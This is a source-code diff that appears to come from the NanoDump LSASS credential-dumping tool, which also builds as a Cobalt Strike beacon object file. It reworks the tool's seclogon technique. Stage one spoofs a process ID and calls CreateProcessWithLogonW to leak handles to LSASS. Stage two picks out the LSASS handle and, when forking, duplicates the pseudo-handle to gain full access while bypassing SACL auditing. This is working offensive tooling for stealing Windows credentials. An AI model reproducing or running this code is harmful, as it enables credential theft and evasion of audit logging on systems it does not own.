@@ -89,7 +89,6 @@ void set_command_line(
     LPCSTR program_name,
     LPCSTR dump_name,
     BOOL fork,
-    BOOL dup,
     BOOL valid
 )
 {
@@ -107,9 +106,6 @@ void set_command_line(
     // --fork
     if (fork)
         wcsncat(command_line, L" -f", MAX_PATH);
-    // --dup
-    if (dup)
-        wcsncat(command_line, L" -d", MAX_PATH);
     // valid
     if (valid)
         wcsncat(command_line, L" -v", MAX_PATH);
@@ -123,14 +119,21 @@ BOOL seclogon_stage_1(
     LPCSTR program_name,
     LPCSTR dump_name,
     BOOL fork,
-    BOOL dup,
     BOOL valid,
     DWORD lsass_pid
 )
 {
-    NTSTATUS status;
     BOOL success;
     PHANDLE_LIST handle_list;
+
+    // if the file already exists, delete it
+    if (file_exists(dump_name))
+    {
+        if (!delete_file(dump_name))
+        {
+            return FALSE;
+        }
+    }
 
     wchar_t command_line[MAX_PATH];
     set_command_line(
@@ -138,7 +141,6 @@ BOOL seclogon_stage_1(
         program_name,
         dump_name,
         fork,
-        dup,
         valid
     );
 
@@ -198,17 +200,13 @@ BOOL seclogon_stage_1(
         memset(&startInfo, 0, sizeof(STARTUPINFOW));
         startInfo.dwFlags = STARTF_USESTDHANDLES;
 
-        startInfo.hStdInput  = handle_list->Handle[handles_leaked++];
+        startInfo.hStdInput = handle_list->Handle[handles_leaked++];
 
         if (handle_list->Count > handles_leaked)
             startInfo.hStdOutput = handle_list->Handle[handles_leaked++];
-        else
-            startInfo.hStdOutput = (HANDLE)1;
 
         if (handle_list->Count > handles_leaked)
             startInfo.hStdError = handle_list->Handle[handles_leaked++];
-        else
-            startInfo.hStdError = (HANDLE)2;
 
         success = pCreateProcessWithLogonW(
             L"NanoDumpUser",
@@ -256,49 +254,74 @@ BOOL seclogon_stage_1(
             intFree(handle_list); handle_list = NULL;
             return FALSE;
         }
-
-        LARGE_INTEGER TimeOut;
-        TimeOut.QuadPart = INFINITE;
-        status = NtWaitForSingleObject(
-            hSpoofedProcess,
-            FALSE,
-            &TimeOut
-        );
-        if (!NT_SUCCESS(status))
+        success = wait_for_process(hSpoofedProcess);
+        if (!success)
         {
-#ifdef DEBUG
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Failed to call NtWaitForSingleObject, status: 0x%lx\n",
-                status
-            );
-#endif
             change_pid(original_pid, NULL);
             intFree(handle_list); handle_list = NULL;
             return FALSE;
         }
-        NtClose(hSpoofedProcess);
+        NtClose(hSpoofedProcess); hSpoofedProcess = NULL;
+        if (file_exists(dump_name))
+        {
+            change_pid(original_pid, NULL);
+            intFree(handle_list); handle_list = NULL;
+            return TRUE;
+        }
     }
     // restore the original PID
     change_pid(original_pid, NULL);
     intFree(handle_list); handle_list = NULL;
-    return TRUE;
+    return FALSE;
 }
 
 #ifndef BOF
 HANDLE seclogon_stage_2(
-    LPCSTR dump_path
+    LPCSTR dump_path,
+    BOOL fork
 )
 {
+    // if the file already exists, exit
+    if (file_exists(dump_path))
+        return NULL;
+
     for (DWORD leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4)
     {
         if (!is_lsass((HANDLE)(ULONG_PTR)leakedHandle))
         {
             NtClose((HANDLE)(ULONG_PTR)leakedHandle);
             continue;
+        }
+        if (fork)
+        {
+            // the leaked handle does not have PROCESS_CREATE_PROCESS right so we cannot use it for NtCreateProcessEx call. Using a trick by @tiraniddo to get a handle with full access:
+            // "The DuplicateHandle system call has an interesting behaviour when using the pseudo current process handle, which has the value -1. Specifically if you try and duplicate the pseudo handle from another process you get back a full access handle to the source process."
+            // details here --> https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html
+            HANDLE hDuped = NULL;
+            NTSTATUS status = NtDuplicateObject(
+                (HANDLE)(ULONG_PTR)leakedHandle,
+                (HANDLE)-1,
+                NtCurrentProcess(),
+                &hDuped,
+                0,
+                0,
+                DUPLICATE_SAME_ACCESS
+            );
+            if (!NT_SUCCESS(status))
+            {
+#ifdef DEBUG
+#ifdef BOF
+                BeaconPrintf(CALLBACK_ERROR,
+#else
+                printf(
+#endif
+                    "Failed to call NtDuplicateObject, status: %ld\n",
+                    status
+                );
+#endif
+                return NULL;
+            }
+            return hDuped;
         }
         return (HANDLE)(ULONG_PTR)leakedHandle;
     }
